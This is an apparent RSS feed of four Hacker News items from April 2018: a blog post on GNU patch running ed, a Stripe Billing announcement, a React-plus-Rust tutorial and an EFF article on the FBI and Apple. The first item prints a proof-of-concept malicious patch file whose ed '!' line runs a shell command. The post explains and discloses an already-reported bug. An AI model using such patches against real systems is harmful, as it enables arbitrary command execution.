<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Patch runs ed, and ed can run anything</title>
<link>http://rachelbythebay.com/w/2018/04/05/bangpatch/</link>
<guid isPermaLink="true" >http://rachelbythebay.com/w/2018/04/05/bangpatch/</guid>
<description>&lt;p&gt;Okay, this is kind of awesome, if you like watching the world burn.&lt;/p&gt;
&lt;p&gt;The short version is: patch runs ed... and ed can run arbitrary commands, including when it's called from patch.&lt;/p&gt;
&lt;p&gt;Check this out. I've taken the proof of concept and changed it slightly:&lt;/p&gt;
&lt;pre&gt;
$ cat evil.patch 
--- /dev/null   2018-13-37 13:37:37.000000000 +0100                            
+++ b/beep.c    2018-13-37 13:38:38.000000000 +0100                            
1337a                                                                          
1,112d                                                                         
!touch /tmp/0wned; ls -la /tmp/0wned
.                                                                              
$ patch &amp;lt; evil.patch 
?
?
-rw-r--r-- 1 edu users 0 Apr  5 10:42 /tmp/0wned
?
patch: **** /usr/bin/ed FAILED
$ 
&lt;/pre&gt;
&lt;p&gt;This came up as part of the discussion on the &quot;beep exploit&quot; yesterday. I found it buried in the HN /new queue as a simple &lt;a href=&quot;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=894667#19&quot;&gt;link to the Debian bug tracker&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This seems far too good to leave hidden in there.&lt;/p&gt;
&lt;p&gt;Subprocesses, am I right?&lt;/p&gt;
&lt;p&gt;Late update: it looks like FreeBSD &lt;a href=&quot;https://www.freebsd.org/security/advisories/FreeBSD-SA-15:18.bsdpatch.asc&quot;&gt;fixed this same sort of thing&lt;/a&gt; in 2015. GNU patch, however (shown above), clearly has not.&lt;/p&gt;
&lt;p&gt;Another update: OpenBSD also &lt;a href=&quot;https://ftp.openbsd.org/pub/OpenBSD/patches/5.7/common/013_patch.patch.sig&quot;&gt;patched it&lt;/a&gt; in 2015. It looks like they had it first, which I suppose makes sense. Also, I'm hearing it can't exec other programs any more, which is pretty awesome. That's the right way to close this kind of door.&lt;/p&gt;
</description>
<pubDate>Thu, 05 Apr 2018 18:19:47 +0000</pubDate>
<dc:creator>akerl_</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://rachelbythebay.com/w/2018/04/05/bangpatch/</dc:identifier>
</item>
<item>
<title>Stripe Billing</title>
<link>https://stripe.com/blog/billing</link>
<guid isPermaLink="true" >https://stripe.com/blog/billing</guid>
<description>&lt;p&gt;Today, we’re excited to launch &lt;a href=&quot;https://stripe.com/billing&quot;&gt;Stripe Billing&lt;/a&gt;, a new suite of tools to help companies of all sizes automate, optimize, and scale recurring business models. This new product is an evolution of Stripe Subscriptions and adds many new features.&lt;/p&gt;
&lt;p&gt;Increasingly, the most innovative companies are establishing recurring relationships with their customers. As these businesses iterate to find the best pricing and sales strategy, they’re often unnecessarily constrained by what their billing system allows. For some companies that already used Stripe, our Subscriptions product was limiting as well. They needed to do more than just simple subscription management. Based on feedback from many of our customers and others, we built Stripe Billing to provide fast-growing businesses the tools to move quickly and design billing around customer experience.&lt;/p&gt;
&lt;p&gt;Stripe Billing has two components. For developers, our APIs provide composable building blocks that make it easy to design and iterate on different billing models. For business teams, we’ve built easy-to-use Dashboard tools that help manage recurring billing from end to end.&lt;/p&gt;
&lt;h3&gt;Flexible building blocks for billing&lt;/h3&gt;
&lt;p&gt;Fast-growing companies regularly experiment with billing as they grow their business and expand their offerings. Examples include Slack’s “fair billing policy”, Meetup’s new metered billing, and Postmates’ recently-launched subscriptions offering. As businesses iterate on pricing and launch new business lines, they need the ability to customize billing quickly and easily.&lt;/p&gt;
&lt;p&gt;At the core of Stripe Billing are new APIs and Dashboard tools that help businesses intuitively design and represent even the most complex billing models—from simple seat licensing to complex multi-layered tiered metered plans. Stripe Billing also makes it easy to add or change billing models, so you can easily test and roll out different pricing. You can learn more in &lt;a href=&quot;https://stripe.com/docs/billing/quickstart&quot;&gt;our docs&lt;/a&gt;.&lt;/p&gt;
&lt;p class=&quot;blog-callout-full&quot;&gt;“Expanding into offerings for businesses not only demanded new product features and capabilities but also foundational changes to Meetup’s billing infrastructure. Stripe’s open API and simple, user-friendly interface made it easy for the entire team.”&lt;br/&gt;&lt;strong&gt;— Sylvan Boucard&lt;/strong&gt;, Product Manager at Meetup&lt;/p&gt;
&lt;h3&gt;Faster payments with Stripe-hosted invoices&lt;/h3&gt;
&lt;p&gt;Stripe Billing also includes a new way for U.S. businesses to invoice customers. Starting today, Stripe can email your customers an invoice that perfectly matches your company’s branding and will securely collect payments. You can &lt;a href=&quot;https://stripe.com/billing#invoices&quot;&gt;try out our demo&lt;/a&gt; or &lt;a href=&quot;https://dashboard.stripe.com/invoices/create&quot;&gt;create an invoice&lt;/a&gt; from your Dashboard.&lt;/p&gt;
&lt;p&gt;In addition to credit and debit card payments, invoices also support ACH and wire transfers in the U.S. This should be especially helpful to businesses that have automated billing for self-serve accounts, but still rely on accounts-receivable processes to handle larger invoices. Behind the scenes, Stripe now generates a unique virtual bank account number for each of your customers, which keeps your company’s banking details private. Any payments received appear in your Stripe balance and invoices are automatically reconciled and marked as closed.&lt;/p&gt;
&lt;p class=&quot;blog-callout-full&quot;&gt;“For large invoice amounts, our customers expect to pay via invoice, rather than credit card. As a fast-growing business, handling invoicing manually quickly became a huge pain. With Stripe, we automate all aspects of invoicing and accepting ACH and wire payments which means we can scale our business faster.”&lt;br/&gt;&lt;strong&gt;— Eric Koslow&lt;/strong&gt;, Co-founder, Lattice&lt;/p&gt;
&lt;h3&gt;Smart revenue recovery&lt;/h3&gt;
&lt;p&gt;Nearly a quarter of churn is caused by missed payments or declined cards. Stripe Billing now includes our automated card updater, which saves your customers from having to do data entry if their card is reissued by automatically syncing new payment details (such as updated expiry dates) from our financial partners.&lt;/p&gt;
&lt;p&gt;We're also introducing a new feature: smart retry logic. It’s powered by the same machine learning infrastructure behind &lt;a href=&quot;https://stripe.com/radar&quot;&gt;Stripe Radar&lt;/a&gt;. Our algorithms train on data across the billions of payments in the Stripe network to predict the right way to retry failed payments. With smart retry logic, we can reduce involuntary churn, maximize payment acceptance, and decrease toil for your users and customer support teams.&lt;/p&gt;
&lt;p&gt;In 2017, Stripe’s recovery tools reduced payment declines up to 45% on average and increased revenue 10% on average.&lt;/p&gt;
&lt;p class=&quot;blog-callout-full&quot;&gt;Bench recovered 12% of revenue through card account updater in 2017.&lt;/p&gt;
&lt;p&gt;We’ve made getting started with Stripe Billing as easy as possible. You can &lt;a href=&quot;https://dashboard.stripe.com/invoices/create&quot;&gt;start sending invoices&lt;/a&gt; today right from the Dashboard. Since Stripe Billing’s APIs are modular, you can choose to build a new metered billing system or run a lightweight pricing experiment for your next product or feature launch. (Flexible billing and smart recovery tools are available globally today. Invoices are available in the U.S. and coming soon to many more countries.)&lt;/p&gt;
&lt;p&gt;If you’re using Stripe Subscriptions today, check out &lt;a href=&quot;https://stripe.com/docs/billing/quickstart&quot;&gt;our guide to getting started&lt;/a&gt;. We hope Stripe Billing helps your business. Let us know if you have any feedback or questions—we’re just getting started and we’d love to &lt;a href=&quot;mailto:noah@stripe.com&quot;&gt;hear from you&lt;/a&gt;.&lt;/p&gt;
&lt;p class=&quot;cta&quot;&gt;Build your recurring business model with Stripe Billing. &lt;a href=&quot;https://stripe.com/billing&quot; class=&quot;button&quot;&gt;Learn More&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 05 Apr 2018 17:20:26 +0000</pubDate>
<dc:creator>craigkerstiens</dc:creator>
<og:title>Introducing Stripe Billing</og:title>
<og:url>https://stripe.com/blog/billing</og:url>
<og:description>We’re launching Stripe Billing, a new suite of tools to help you automate, optimize, and scale recurring business models.</og:description>
<og:image>https://stripe.com/img/v3/billing/social.png</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://stripe.com/blog/billing</dc:identifier>
</item>
<item>
<title>Making a Statically-Linked, Single-File Web App with React and Rust</title>
<link>https://anderspitman.net/2018/04/04/static-react-rust-webapp/</link>
<guid isPermaLink="true" >https://anderspitman.net/2018/04/04/static-react-rust-webapp/</guid>
<description>&lt;a class=&quot;btn home&quot; href=&quot;https://anderspitman.net/&quot; title=&quot;&quot;&gt;«&lt;/a&gt;&lt;footer class=&quot;post-info&quot;&gt;&lt;span class=&quot;post-meta&quot;&gt;&lt;time datetime=&quot;2018.04.04&quot;&gt;2018.04.04&lt;/time&gt;&lt;/span&gt;&lt;/footer&gt;&lt;p&gt;This tutorial will cover the basics of creating a minimal React app which can be deployed as a statically-linked Rust binary. What this accomplishes is having all of your code, including HTML, JavaScript, CSS, and Rust, packaged into a single file that will run on pretty much any 64-bit Linux system, regardless of the kernel version or installed libraries.&lt;/p&gt;
&lt;p&gt;Complete source is available on &lt;a href=&quot;https://github.com/anderspitman/react_rust_webapp&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Simpler deployment:&lt;/strong&gt; Having a static binary means you just have to copy the file to your servers and run it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Cross-platform native GUI apps:&lt;/strong&gt; One of the biggest challenges in creating a cross-platform GUI app is working with a GUI library that targets all the platforms you’re interested in. The approach here lets you leverage the user’s browser for this purpose. This is somewhat similar to what &lt;a href=&quot;https://electronjs.org/&quot;&gt;Electron&lt;/a&gt; accomplishes, but your backend is in Rust rather than JavaScript, and the user navigates to the app from their browser. There are certainly tradeoffs here, but it can work well for some apps. I was first introduced to this approach by &lt;a href=&quot;https://syncthing.net/&quot;&gt;syncthing&lt;/a&gt;, which is written in go but does a similar thing.&lt;/li&gt;
&lt;li&gt;Because I’ve been obsessed with static linking for as long as I can remember and I’m not really sure why.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We’re going to let cargo manage the project directory for us. Run the following commands:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cargo new --bin react_rust_webapp
cd react_rust_webapp
&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;First install React, Babel, and Webpack:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;mkdir ui
cd ui
npm init -y
npm install --save react react-dom
npm install --save-dev babel-core babel-loader babel-preset-env babel-preset-react webpack webpack-cli
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Then create the source files:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;mkdir dist
touch dist/index.html
mkdir src
touch src/index.js
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Put the following content in &lt;code&gt;dist/index.html&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!doctype html&amp;gt;
&amp;lt;html&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;Static React and Rust&amp;lt;/title&amp;gt;
  &amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;div id=&quot;root&quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;script src=&quot;/bundle.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;And set &lt;code&gt;src/index.js&lt;/code&gt; to the following:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;import React from 'react';
import ReactDOM from 'react-dom';

ReactDOM.render(
  &amp;lt;h1&amp;gt;Hi there&amp;lt;/h1&amp;gt;,
  document.getElementById('root')
);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;We will also need a &lt;code&gt;.babelrc&lt;/code&gt; file:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-json&quot;&gt;{
  &quot;presets&quot;: [
    &quot;react&quot;,
    &quot;env&quot;,
  ],
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;And a &lt;code&gt;webpack.config.js&lt;/code&gt; file:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;const path = require('path');

module.exports = {
  entry: './src/index.js',
  output: {
    filename: 'bundle.js',
    path: path.resolve(__dirname, 'dist')
  },
  module: {
    rules: [
      {
        test: /\.(js|jsx)$/,
        exclude: /node_modules/,
        use: {
          loader: 'babel-loader',
        }
      }
    ]
  }
};
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;You should now be able to test that the frontend stuff is working. Run:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;npx webpack --mode development
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This will generate &lt;code&gt;dist/bundle.js&lt;/code&gt;. If you start a web server in the &lt;code&gt;dist&lt;/code&gt; directory you should be able to successfully serve the example content.&lt;/p&gt;
&lt;p&gt;Now for the Rust part.&lt;/p&gt;

&lt;p&gt;Move up to the &lt;code&gt;react_rust_webapp&lt;/code&gt; directory:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cd ..
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;First thing we need to do is install a web framework. I found &lt;a href=&quot;https://github.com/tomaka/rouille&quot;&gt;Rouille&lt;/a&gt; to be great for this simple example. I also really love &lt;a href=&quot;https://github.com/SergioBenitez/Rocket&quot;&gt;Rocket&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Add rouille to your Cargo.toml dependencies:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-toml&quot;&gt;[package]
name = &quot;react_rust_webapp&quot;
version = &quot;0.1.0&quot;

[dependencies]
rouille = &quot;2.1.0&quot;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Now modify &lt;code&gt;src/main.rs&lt;/code&gt; to have the following content:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;#[macro_use]
extern crate rouille;

use rouille::Response;

fn main() {
    let index = include_str!(&quot;../ui/dist/index.html&quot;);
    let bundle = include_str!(&quot;../ui/dist/bundle.js&quot;);
    rouille::start_server(&quot;0.0.0.0:5000&quot;, move |request| {

        let response = router!(request,
            (GET) [&quot;/&quot;] =&amp;gt; {
                Response::html(index)
            },
            (GET) [&quot;/bundle.js&quot;] =&amp;gt; {
                Response::text(bundle)
            },
            _ =&amp;gt; {
                Response::empty_404()
            }
        );

        response
    });
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;What is this doing?&lt;/p&gt;
&lt;p&gt;At compile time, &lt;code&gt;include_str!&lt;/code&gt; reads the indicated file and inserts the contents as a static string into the compiled binary. This string is then available as a normal variable.&lt;/p&gt;
&lt;p&gt;The rouille code just sets up two HTTP endpoints, “/” and “/bundle.js”. Instead of returning the files from the filesystem as we’d typically do with a web app, we’re returning the contents of the statics strings from the binary.&lt;/p&gt;
&lt;p&gt;To learn more about using Rouille to do more advanced stuff refer to their docs.&lt;/p&gt;

&lt;p&gt;Alright, now if all went well we should be able to run it. Make sure &lt;code&gt;ui/dist/bundle.js&lt;/code&gt; has already been generated as instructed above. Then run:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cargo run
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;It should start a server on port 5000. If you navigate to &lt;a href=&quot;http://localhost:5000&quot;&gt;http://localhost:5000&lt;/a&gt; in your browser you should see “Hi there”.&lt;/p&gt;

&lt;p&gt;This part can be skipped if you don’t need 100% static linking. Rust statically links most libraries by default anyway, except for things like libc.&lt;/p&gt;
&lt;p&gt;If you do want to proceed, you’ll first need to install &lt;a href=&quot;https://www.musl-libc.org/&quot;&gt;musl libc&lt;/a&gt; on your system and ensure the musl-gcc command is on your PATH.&lt;/p&gt;
&lt;p&gt;Then, rerun cargo as follows:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cargo run --target=x86_64-unknown-linux-musl
&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;For smaller binaries, build &lt;code&gt;bundle.js&lt;/code&gt; as follows (from with &lt;code&gt;ui/&lt;/code&gt;):&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;npx webpack --mode production
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;And run cargo as follows:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cargo build --release --target=x86_64-unknown-linux-musl
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;You should end up with a statically linked binary in &lt;code&gt;react_rust_webapp/target/x86_64-unknown-linux-musl/release/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This is just the basics. There’s a lot more you could do with this, including:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Use &lt;code&gt;build.rs&lt;/code&gt; to automatically build the React app when you compile Rust.&lt;/li&gt;
&lt;li&gt;Take the port number from the command line&lt;/li&gt;
&lt;li&gt;Serialized (probably JSON) requests and responses&lt;/li&gt;
&lt;li&gt;Run webpack as an npm script command&lt;/li&gt;
&lt;li&gt;Target other OSes. I haven’t tried yet, but this should be mostly transferable to MacOS and Windows, thanks to the awesomeness that is Rust/Cargo and the universal availability of web browsers.&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Thu, 05 Apr 2018 14:09:54 +0000</pubDate>
<dc:creator>anderspitman</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://anderspitman.net/2018/04/04/static-react-rust-webapp/</dc:identifier>
</item>
<item>
<title>The FBI could have broken into San Bernadino shooter&amp;#039;s phone without Apple</title>
<link>https://www.eff.org/deeplinks/2018/04/fbi-could-have-gotten-san-bernardino-shooters-iphone-leadership-didnt-say</link>
<guid isPermaLink="true" >https://www.eff.org/deeplinks/2018/04/fbi-could-have-gotten-san-bernardino-shooters-iphone-leadership-didnt-say</guid>
<description>&lt;p&gt;&lt;span&gt;The Department of Justice’s Office of the Inspector General (OIG) last week &lt;a href=&quot;https://oig.justice.gov/reports/2018/o1803.pdf&quot;&gt;released a new report&lt;/a&gt; that supports what EFF has long suspected: that the FBI’s legal fight with Apple in 2016 to create backdoor access to a San Bernardino shooter’s iPhone was more focused on creating legal precedent than it was on accessing the one specific device.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;The report, called a “special inquiry,” details the FBI’s failure to be completely forthright with Congress, the courts, and the American public. While the OIG report concludes that neither former FBI Director James Comey, nor the FBI officials who submitted sworn statements in court had “testified inaccurately or made false statements” during the roughly month-long saga, it illustrates just how close they came to lying under oath.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;From the onset, we suspected that the FBI’s primary goal in its effort to access to an &lt;a href=&quot;https://www.eff.org/cases/apple-challenges-fbi-all-writs-act-order&quot;&gt;iPhone found in the wake of the December 2015 mass shootings in San Bernardino&lt;/a&gt; wasn’t simply to unlock the device at issue. Rather, we believed that the FBI’s intention with the litigation was to obtain legal precedent that it could compel Apple to sabotage its own security mechanisms. Among other disturbing revelations, the new OIG report confirms our suspicion: senior leaders within the FBI were “definitely not happy” when the agency realized that another solution to access the contents of the phone had been found through an outside vendor and the legal proceeding against Apple couldn’t continue.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;By way of digging into the OIG report, let’s take a look at the timeline of events:&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;December 2, 2015: a shooting in San Bernardino results in the deaths of 14 people, including the two shooters. The shooters destroy their personal phones but leave a third phone—owned by their employer—untouched.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;February 9, 2016: Comey &lt;a href=&quot;https://www.intelligence.senate.gov/hearings/open-hearing-worldwide-threats-hearing&quot;&gt;testifies&lt;/a&gt; that the FBI cannot access the contents of the shooters’ remaining phone.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;February 16, 2016: the FBI applies for (and Magistrate Judge Pym grants the same day) an application for an &lt;a href=&quot;https://assets.documentcloud.org/documents/2714001/SB-Shooter-Order-Compelling-Apple-Asst-iPhone.pdf&quot;&gt;order&lt;/a&gt; compelling Apple to develop a new method to unlock the phone.&lt;/span&gt;&lt;span&gt;As part of that application, the FBI Supervisory Special Agent in charge of the investigation of the phone swears under oath that the FBI had “explored other means of obtaining [access] . . . and we have been unable to identify any other methods feasible for gaining access” other than compelling Apple to create a custom, &lt;a href=&quot;https://www.eff.org/deeplinks/2016/03/deep-dive-why-forcing-apple-write-and-sign-code-violates-first-amendment&quot;&gt;cryptographically signed&lt;/a&gt; version of iOS to bypass a key security feature and allow the FBI to access the device.&lt;/span&gt;&lt;span&gt;At the same time, according to the OIG report, the chief of the FBI’s Remote Operations Unit (the FBI’s elite hacking team, called ROU) knows “that one of the vendors that he worked closely with was almost 90 percent of the way toward a solution that the vendor had been working on for many months.”&lt;br/&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;Let’s briefly step out of the timeline to note the discrepancies between what the FBI was saying in early 2016 and what they actually knew. How is it that senior FBI officials testified that the agency had no capability to access the contents of the locked device when, the agency’s own premier hacking team knew capability was within reach? Because, according to the OIG report, FBI leadership doesn’t ask the ROU for its help until &lt;em&gt;after&lt;/em&gt; testifying that FBI’s techs knew of no way in.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;pull-quote&quot;&gt;&lt;span&gt;The OIG report concluded that Director Comey didn’t know that his testimony was false at the time he gave it. But it was false, and technical staff in FBI’s own ROU knew it was false.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Now, back to the timeline:&lt;/p&gt;
&lt;ul readability=&quot;-0.98180314309347&quot;&gt;&lt;li readability=&quot;0.98947368421053&quot;&gt;&lt;span&gt;March 1, 2016: Director Comey again &lt;a href=&quot;https://judiciary.house.gov/wp-content/uploads/2016/02/114-78_98899.pdf&quot;&gt;testifies&lt;/a&gt; that the FBI has been unable to access the contents of the phone without Apple’s help. Before the government applied for the All Writs Act order on February 11, Comey notes there were “a whole lot of conversations going on in that interim with companies, with other parts of the government, with other resources to figure out if there was a way to do it short of having to go to court.”&lt;/span&gt;&lt;span&gt;In response to a question from Rep. Daryl Issa whether Comey was “testifying today that you and/or contractors that you employ could not achieve this without demanding an unwilling partner do it,” Comey replies “Correct.”&lt;br/&gt;&lt;/span&gt;
&lt;p&gt;&lt;span&gt;&lt;br/&gt;The OIG report concluded that Director Comey didn’t know that his testimony was false at the time he gave it. But it was false, and technical staff in FBI’s own ROU knew it was false.&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;span&gt;March 16, 2016: An outside vendor for the FBI completes its work on an exploit for the model in question, building on the work that, as of February 16, the ROU knew to be 90% complete.&lt;br/&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;The head of the FBI’s Cryptologic and Electronics Analysis Unit (CEAU)—the unit whose initial inability to access the phone led to the FBI’s sworn statements that the Bureau knew of no method to do so—is pissed that others within FBI are even trying get into the phone without Apple’s help. In the words of the OIG report, “he expressed disappointment that the ROU Chief had engaged an outside vendor to assist with the Farook iPhone, asking the ROU Chief, ‘Why did you do that for?’”&lt;br/&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;Why is the CEAU Chief angry? Because it means that the legal battle is over and the FBI won’t be able to get the legal precedent against Apple that it was looking for. Again, the OIG report confirms our suspicions: “the CEAU Chief ‘was definitely not happy’ that the legal proceeding against Apple could no longer go forward” after the ROU’s vendor succeeded.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;March 20, 2016: The FBI’s outside vendor demonstrates the exploit for senior FBI leadership.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;March 21, 2016: &lt;u&gt;&lt;a href=&quot;https://www.eff.org/deeplinks/2016/03/win-now-court-postpones-hearing-apple-v-fbi&quot;&gt;On the eve of the scheduled hearing&lt;/a&gt;&lt;/u&gt;, the Department of Justice notifies the court in California, that, despite previous statements under oath that there were no “other methods feasible for gaining access,” they’ve now somehow found a way.&lt;br/&gt;&lt;/span&gt; &lt;span&gt;&lt;br/&gt;In response to the FBI’s eleventh-hour revelation, the court cancels the hearing and the legal battle between the FBI and Apple is over for now.&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;The OIG report comes on the heels of a &lt;a href=&quot;https://www.nytimes.com/2018/03/24/us/politics/unlock-phones-encryption.html&quot;&gt;report by the New York Times&lt;/a&gt; that the Department of Justice is renewing its &lt;a href=&quot;https://www.eff.org/deeplinks/2014/10/90s-and-now-fbi-and-its-inability-cope-encryption&quot;&gt;decades-long fight&lt;/a&gt; for anti-encryption legislation. According to the Times, DOJ officials are “convinced that mechanisms allowing access to [encrypted] data can be engineered without intolerably weakening the devices’ security against hacking.”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;That’s a bold claim, given that for years the consensus in the technical community has been exactly the opposite. In the 90’s, experts exposed serious flaws in proposed systems to give law enforcement access to encrypted data without compromising security, including the Clipper Chip. And, as the authors of the 2015 “&lt;a href=&quot;http://spar.isi.jhu.edu/~mgreen/paper-keys-under-doormats.pdf&quot;&gt;Keys Under Doormats&lt;/a&gt;” paper put it, “today’s more complex, global information infrastructure” presents “far more grave security risks” for these approaches.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;The Department’s blind faith in technologists’ ability to build a secure backdoor on encrypted phones is inspired by presentations by several security researchers as part of the recent &lt;a href=&quot;https://www.eff.org/deeplinks/2018/02/new-national-academy-sciences-report-encryption-asks-wrong-questions&quot;&gt;National Academy of Sciences (NAS) report on encryption&lt;/a&gt;. But the NAS &lt;a href=&quot;https://www.nap.edu/read/25010/chapter/1&quot;&gt;wrote&lt;/a&gt; that these proposals were not presented in “sufficient detail for a technical evaluation,” so they have yet to be rigorously tested by other security experts, let alone pass muster. Scientific and technical consensus is always open to challenge, but we—and the DOJ—should not abandon the longstanding view, backed by evidence, that deploying widespread special access mechanisms present insurmountable technical and practical challenges.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;The Times article also suggests that even as DOJ officials tout the possibility of secure backdoors, they’re simultaneously lowering the bar, arguing that a solution need not be “foolproof” if it allows the government to catch “ordinary, less-savvy criminals.” The problem with that statement is at least two-fold:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;First, according to the FBI, it is the savvy criminals (and terrorists) who present the biggest risk of using encryption to evade detection. By definition, less-savvy criminals will be easier for law enforcement to catch without guaranteed access to encrypted devices. Why is it acceptable to the FBI that the solutions they demand are necessarily incapable of stopping the very harms they claim they most need backdoors in order to stop?&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Second, the history in this area demonstrates that “not foolproof” often actually means “completely insecure.” That’s because any system that is designed to allow law enforcement agencies all across the country to expeditiously decrypt devices pursuant to court order will be enormously complex, raising the likelihood of serious flaws in implementation. And, regardless of who holds them, the keys used to decrypt these devices will need to be used frequently, making it even harder to defend them from bad actors. These and other technical challenges mean that the risks of actually deploying an imperfect exceptional access mechanism to millions of phones are unacceptably high. And of course, any system implemented in the US will be demanded by repressive governments around the world.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;The DOJ’s myopic focus on backdooring phones at the expense of the devices’ security is especially vexing in light of &lt;a href=&quot;https://motherboard.vice.com/en_us/article/kzxwwz/state-department-seemingly-buys-dollar15000-iphone-cracking-tech-graykey&quot;&gt;reports&lt;/a&gt; that law enforcement agencies are increasingly able to use commercial unlocking tools to break into essentially any device on the market. And if this is the status quo without mandated backdoor access and as vendors like Apple take steps to harden their devices against hacking, imagine how vulnerable devices could be with a legal mandate. The FBI likes to paint encryption in an apocalyptic light, suggesting that the technology drastically undermines the Bureau’s ability to do its job, but the evidence from the Apple fight and elsewhere is far less stark.&lt;/p&gt;
</description>
<pubDate>Thu, 05 Apr 2018 13:31:46 +0000</pubDate>
<dc:creator>grecy</dc:creator>
<og:type>article</og:type>
<og:title>The FBI Could Have Gotten Into the San Bernardino Shooter’s iPhone, But Leadership Didn’t Say That</og:title>
<og:url>https://www.eff.org/deeplinks/2018/04/fbi-could-have-gotten-san-bernardino-shooters-iphone-leadership-didnt-say</og:url>
